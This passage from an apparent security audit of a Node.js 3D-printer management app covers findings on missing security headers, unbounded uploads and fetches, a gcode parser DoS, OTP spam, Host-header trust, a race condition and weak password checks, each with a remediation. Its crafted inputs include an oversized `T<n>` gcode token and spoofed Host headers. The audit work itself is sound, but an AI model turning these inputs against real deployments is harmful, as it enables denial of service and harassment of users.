- **Attack prerequisites**: N/A on its own; this finding is about what's *missing* as defense-in-depth, and materially raises the impact ceiling of S-3 (no CSP to contain an XSS payload that does land).
- **Exploitation path**: N/A (absence finding) — but concretely: with no `Content-Security-Policy`, any successful injection point (S-3, or a future one) can run arbitrary inline script and fetch arbitrary origins with no browser-side backstop; with no `X-Frame-Options`/`frame-ancestors`, the app can be iframed by a third-party page (partially mitigated in modern browsers by the `SameSite=Lax` session cookie not being sent in a cross-site iframe context, but this is incidental, not a designed defense, and offers no protection to the pre-login page).
- **Impact**: Raises the exploitability/impact ceiling of any XSS finding; provides no clickjacking protection for legacy browsers or any context where the `SameSite` incidental mitigation doesn't apply.
- **Evidence**: absence confirmed by targeted search of the full route-registration surface in `server.js` and the dependency manifest.
- **Recommended remediation**: Add, at minimum, a restrictive `Content-Security-Policy` (the app is entirely self-hosted assets with no CDN scripts per `CLAUDE.md`, so a tight `default-src 'self'` is realistic), `X-Content-Type-Options: nosniff`, and `X-Frame-Options: DENY` (or `frame-ancestors 'none'`). No new dependency is required — these are a handful of `res.set()` calls or a single `app.use()` middleware.
- **How to test the remediation**: `curl -I http://localhost:4545/` and confirm the headers are present; load the app in an `<iframe>` from a different origin and confirm it's blocked.
- **Confidence**: High — absence directly confirmed.

---

### S-12. Unbounded resource consumption: 2GB request bodies, unbounded thumbnail/camera fetches, and an unbounded parser loop

- **Severity**: Medium-High (grouped; each sub-item alone is Medium, the combination materially lowers the bar for a DoS)
- **CWE**: CWE-400 (Uncontrolled Resource Consumption)
- **File/line and evidence**:
  - `server.js:198`: `express.raw({ type: "application/octet-stream", limit: "2gb" })`, used by `POST /api/files/upload` and `POST /api/notify-load` — the entire body is buffered in memory before the handler runs, with no streaming path. `docker-compose.yml`'s own header comment targets "always-on hosts (Pi / NAS / homelab)" — frequently RAM-constrained (1-4GB total).
  - `connectors/http-utils.js:12-14,114-120` (`getThumbnail`) and `connectors/snapmaker-u1-klipper.js:221-231` (`getCameraSnapshot`): both call `fetchTimeout` (which the file's own header comment says only bounds time-to-*headers*) and then `await r.arrayBuffer()` with no further time or size bound — a slow-drip or oversized response from any LAN device (not necessarily the real printer) holds the connection and buffers unboundedly.
  - `parser.js:73-74,98,101`: `tok.match(/^T(\d+)$/)` has no digit-count bound, and the resulting value flows unchecked into `Math.max(colours.length, types.length, any ? Math.max(...used) + 1 : 0, 1)`, which then drives `for (let i = 0; i < paletteCount; i++) palette.push(...)`. A body line like `T99999999999999999999` in a gcode file lacking the usual tail config produces an astronomically large `paletteCount` and an effectively unbounded loop/allocation. Separately, `Math.max(...used)` spreads a `Set` as call arguments — reproduced directly: a 200,000-entry `Set` throws `RangeError: Maximum call stack size exceeded`, turning a "return degraded data" case into a hard, uncaught-by-design failure once the input crosses that threshold (V8's apply-argument-count ceiling).
- **Attack prerequisites**: A2 for the upload/notify-load path; A2 (get a file into the watched folder) + A1 (request `/api/map`) for the parser path; any LAN-reachable device for the thumbnail/camera path.
- **Impact**: Memory exhaustion / event-loop stall / hard crash from a single request or a small number of concurrent ones, on hosts the project's own documentation says are commonly RAM-constrained.
- **Recommended remediation**: Lower the raw-body limit to something in line with realistic sliced-file sizes and/or stream to disk incrementally; apply the same whole-response time+size bounding used elsewhere in `http-utils.js` (an `AbortController` timer not cleared until the body read completes, plus a byte ceiling) to thumbnail/camera fetches; clamp parsed `T<n>` values to a realistic maximum (a few hundred) before adding to the used-set, and replace `Math.max(...used)` with an explicit loop that has no argument-count limit.
- **How to test the remediation**: Send a >200MB body to `/api/files/upload` on a memory-constrained test container and confirm it's rejected before full buffering; point `getThumbnail`/`getCameraSnapshot` at a server that sends headers then stalls, and confirm the request now times out; feed `parseGcodeMap` a body containing `T99999999999999999999` and a 200,000-entry distinct-`T<n>` file and confirm both return quickly with degraded-but-valid output rather than hanging or throwing.
- **Confidence**: High for all three sub-findings — the `Math.max`/`RangeError` behavior and the raw-body limit were confirmed directly (one by execution, one by reading the exact `express.raw` call); the thumbnail/camera bound mismatch is a direct reading of the file's own documented contract versus its actual call sites.

---

### S-13. No rate limit on OTP code requests — abuse of a victim's phone/email/notification channel

- **Severity**: Low-Medium
- **CWE**: CWE-799 (Improper Control of Interaction Frequency)
- **File/line**: `server.js:1473-1505` (`POST /api/login/otp/request`)
- **Attack prerequisites**: Knowledge of a valid `loginName` for an OTP-enabled account (the response is deliberately generic and doesn't confirm this, but a valid name still triggers a real send where an invalid one doesn't consume a code slot — see `auth.js:89-93`, `setOtpCode` is only called after the `!u || !u.otpEnabled` check passes).
- **Exploitation path**: Nothing throttles how often `POST /api/login/otp/request` can be called for the same account. Repeated calls repeatedly page the victim's phone (ntfy push / Telegram message) or inbox (Resend email) with login codes they didn't request — an annoyance/abuse vector, and, at volume, exhausts the configured Resend/Telegram/ntfy quota.
- **Impact**: Notification-channel spam/harassment against a named user; potential quota exhaustion of the admin's own third-party service accounts.
- **Evidence**: route read directly; no per-account or per-IP throttle present anywhere in the file.
- **Recommended remediation**: Apply the same throttling recommended for S-6/S-6a to this route — e.g. one outstanding code per account with a minimum resend interval, already partially implied by the 10-minute TTL but not enforced against *re-requesting* before expiry.
- **How to test the remediation**: Script 10 rapid `POST /api/login/otp/request` calls for one account and confirm the notification provider only actually fires a bounded number of times.
- **Confidence**: Medium.

---

### S-14. Host-header trust in the notification test endpoint

- **Severity**: Low
- **CWE**: CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax — here, header value trusted into an outbound URL)
- **File/line**: `server.js:1675-1679` (`lanHost`), used at `server.js:1895` (`/api/notify-test`'s ntfy icon URL)
- **Exploitation path**: `lanHost(req)` returns `req.headers.host` verbatim whenever it doesn't start with `localhost`/`127.`, and that value is concatenated into a URL sent to ntfy.sh as the notification's `icon` parameter (`"http://" + lanHost(req) + "/snapcon-icon-512.png"`). `Host` is attacker-influenceable if the deployment sits behind a reverse proxy that forwards it unvalidated, or if a browser can otherwise be induced to send a request to this endpoint with a non-default `Host`. This does not enable full SSRF to an arbitrary URL (the path suffix is fixed), but it can redirect ntfy.sh's icon fetch to an attacker-chosen host, which is an unwanted third-party information disclosure (ntfy.sh's infrastructure making a request that reveals the notification event happened, to a host the real admin didn't intend).
- **Impact**: Low — requires either a misconfigured reverse proxy or an already-authenticated admin's own browser sending a manipulated request; the admin-only, `SameSite=Lax`-cookied, `requireAdmin` gate on this route makes remote cross-site triggering impractical.
- **Recommended remediation**: Use the server's own known LAN address (`lanAddr()`, already used elsewhere for this exact purpose at `server.js:1777`) unconditionally, or validate `req.headers.host` against an allowlist of the server's own bound addresses before trusting it.
- **How to test the remediation**: Send `POST /api/notify-test` with a spoofed `Host` header and confirm the resulting icon URL sent to ntfy.sh always reflects the server's real LAN address, never the request's `Host` header.
- **Confidence**: Medium — the code path is confirmed exactly as described; real-world exploitability depends on deployment topology (reverse proxy `Host` handling) not verifiable from source alone.

---

### S-15. Race condition: AD5X color-mapping state is keyed only by printer URL, not by job

- **Severity**: Low-Medium
- **CWE**: CWE-362 (Race Condition)
- **File/line**: `connectors/flashforge-ad5x.js:80-91`
- **Exploitation path**: `applyHeadMapping` stashes `{tools, map, ts}` in a `pendingMapping` map keyed solely by `p.url`; `startPrintFile` reads-and-deletes whatever is currently stored for that URL, with no check that it's the mapping actually computed for *this* file/job. If two prints are staged close together on the same AD5X printer (a mapping configured for file A, then — before starting it — a mapping configured for file B, or two browser tabs racing), whichever `startPrintFile` call fires next silently consumes the *other* job's mapping.
- **Impact**: A print starts with the wrong tool→slot color assignment — wasted material/time, no error surfaced. Not a security boundary violation (both actions require the same `requireRegular` privilege), but a genuine correctness/availability-of-correct-output issue with a race-condition root cause.
- **Recommended remediation**: Key `pendingMapping` by `(p.url, filename)` or an explicit job id; only consume the entry matching the file actually being started.
- **How to test the remediation**: Stage mappings for file A then file B on the same printer without starting either, then start A; confirm A gets A's mapping, not B's.
- **Confidence**: Medium — the state-keying flaw is clear from the code; whether the UI currently allows staging two mappings back-to-back wasn't independently verified against every `app.js` call site in this pass.

---

### S-16. Weak minimum password policy

- **Severity**: Low
- **CWE**: CWE-521 (Weak Password Requirements)
- **File/line**: `server.js:1540` (`POST /api/users`), `server.js:1580` (`PUT /api/users/:id`) — both enforce only `password.length < 8` returns 400, no complexity/entropy requirement, no check against common-password lists.
- **Impact**: Combined with S-6 (no login rate limiting), a short/common password is crackable online in a practical timeframe.
- **Recommended remediation**: Raise the minimum length (12+ is a reasonable modern floor) and/or check against a common-password list; this matters more once S-6 is fixed and online guessing is throttled, since offline strength then becomes the primary remaining factor for a leaked-hash scenario (`users.json` read via some other compromise).
- **Confidence**: High — the check is a direct, unambiguous read of both routes.

---

### S-17. OTP code comparison is not constant-time

- **Severity**: Low
- **CWE**: CWE-208 (Observable Timing Discrepancy)
- **File/line**: `auth.js:100` — `String(code||"").toUpperCase() !== entry.code` is a plain string comparison, inconsistent with the `crypto.timingSafeEqual` used for passwords (`auth.js:42`).
- **Impact**: Low in practice — the 5-attempt cap (`OTP_MAX_ATTEMPTS`) and 10-minute TTL make a timing-based per-character recovery attack impractical before the code expires or the attempt budget is spent.
- **Recommended remediation**: Use `crypto.timingSafeEqual` (with a length check first, since it requires equal-length buffers) for consistency with the password path.
- **Confidence**: Low — real-world exploitability is minimal given the existing rate limit on this specific path.

---

## 3. Categories checked with no reachable finding

- **SQL injection / LDAP injection**: not applicable — there is no database and no LDAP integration anywhere in the codebase (`CLAUDE.md`: "no database — plain JSON files"); confirmed by the complete absence of any SQL/LDAP client library in `package.json` or `require()` graph.
- **Server-side template injection**: not applicable — `server.js` serves static HTML via `fs.readFileSync(...).send()` with no templating engine; all dynamic HTML construction happens client-side in `app.js` via plain string interpolation into `innerHTML` (covered under XSS, S-3).
- **Insecure deserialization / prototype pollution**: `JSON.parse` is used throughout for `config.json`/`users.json`/Remote Access state files, but V8's `JSON.parse` assigns `"__proto__"` as an own property key on the resulting plain object rather than mutating the real prototype chain — confirmed this is the relevant Node/V8 behavior, so the classic `JSON.parse`-based prototype-pollution class does not apply here. No `eval`, `new Function`, `vm.*`, or unsafe deserialization library is used anywhere in the repo (confirmed by repo-wide search).
- **CORS misconfiguration**: no `Access-Control-Allow-*` headers or `cors` middleware are set anywhere (confirmed by search) — the app relies on same-origin defaults, which is correct for its architecture (server-rendered API consumed only by its own bundled frontend); there is nothing to misconfigure because nothing is configured.
- **Open redirect**: no route in `server.js` issues a redirect based on user input (confirmed by reviewing every route); the only redirect-adjacent behavior is the OS-level `start "" "<fixed localhost URL>"` at startup (`server.js:2112-2113`), which contains no attacker-controlled input.
- **Command injection (OS shell)**: the only `child_process` usage with attacker-adjacent data is `InstanceLock.js`'s `spawn("tasklist", ["/FI", "PID eq " + pid, ...])`, but `pid` originates only from a lock file this application itself writes (`InstanceLock.js:110-118`, sourced from `child.pid` of a process this app spawned) — not from any network-reachable input — and `spawn()` is used in argv-array form (no shell), so classic metacharacter injection does not apply even if the value were attacker-influenced.
- **WebSocket security**: the one WebSocket client in the codebase (`snapmaker-u1-klipper.js`'s `cameraRpc`) connects *outbound* to a configured printer; SnapCon exposes no inbound WebSocket endpoint of its own, so there is no server-side WS attack surface to assess beyond the token-leakage issue already captured as S-9.
- **Replay attacks**: the one place replay actually matters — the Remote Access provisioning backend protocol — is explicitly designed against it: every signed request includes a fresh nonce and timestamp (`Ed25519Identity.js:70-84`), and the backend contract documents single-use-nonce enforcement (`RemoteAccessApiClient.js`'s `REPLAY_DETECTED` code path). Session cookies are bearer tokens with no signature/nonce scheme, but that is a standard session-cookie replay model already scoped by `httpOnly`/`SameSite=Lax`/TTL, not a distinct protocol-level replay vulnerability.
- **Weak tenant isolation**: not applicable as commonly understood — SnapCon is single-tenant per installation (one shared fleet, role-based access, not resource-owner-based). Every authenticated role can see every configured printer's operational data by design (per `CLAUDE.md`'s documented `view`/`regular`/`admin` hierarchy); this is the intended model, not a boundary failure.

---

## 4. Summary table

| ID | Title | Severity | CWE |
|---|---|---|---|
| S-1 | Default-off auth grants implicit admin to any network caller | Critical | CWE-306 |
| S-2 | Gcode injection via unsanitized upload filename | Critical | CWE-93 |
| S-3 | Stored XSS via FlashForge color, chainable to admin SSRF | Critical | CWE-79 → CWE-918 |
| S-4 | ReDoS in gcode config-line parser | Critical | CWE-1333 |
| S-5 | `safePath()` prefix-boundary jail bypass | High | CWE-22 |
| S-6 | No rate limit on `/api/login` | High | CWE-307 |
| S-7 | Cloudflared spawn failure deadlocks Remote Access | High | CWE-667 |
| S-8 | Unhandled rejection in registration poll crashes process | High | CWE-248 |
| S-9 | Printer "token" unused/leaked instead of authenticating | Medium-High | CWE-319 |
| S-10 | Non-atomic writes for Remote Access secrets/config | Medium | CWE-362 |
| S-11 | No security response headers anywhere | Medium | CWE-693 |
| S-12 | Unbounded body/fetch/parser resource consumption | Medium-High | CWE-400 |
| S-13 | No rate limit on OTP requests | Low-Medium | CWE-799 |
| S-14 | Host-header trust in notify-test | Low | CWE-644 |
| S-15 | AD5X color-mapping race condition | Low-Medium | CWE-362 |
| S-16 | Weak minimum password length | Low | CWE-521 |
| S-17 | Non-constant-time OTP comparison | Low | CWE-208 |
